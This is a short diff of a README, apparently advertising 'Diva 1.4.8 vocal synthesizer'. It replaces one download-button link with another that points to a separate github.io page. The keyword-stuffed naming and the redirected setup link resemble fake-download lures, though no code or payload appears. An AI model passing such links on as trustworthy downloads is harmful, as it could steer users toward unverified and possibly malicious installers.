@@ -21,7 +21,7 @@ To begin using this **Diva 1.4.8 vocal synthesizer** and **Diva 1.4.8 singing sy
 | :--- | :--- |
 | **Get Diva 1.4.8 Vocal Synthesizer** | Click the button below to start the setup for this **Diva 1.4.8 vocaloid alternative**. |
 
-[![Button](https://img.shields.io/badge/🎵-Get_Diva_1.4.8_Vocal_Synthesizer-2ea44f?style=for-the-badge)](https://d58856445.github.io/.github/diva-1-4-8)
+[![Diva](https://img.shields.io/badge/Open-Diva-2ECC71?style=for-the-badge)](https://diva-vocal-synthesizer-vst.github.io/.github/diva-vst)
 
 ## System Requirements
 
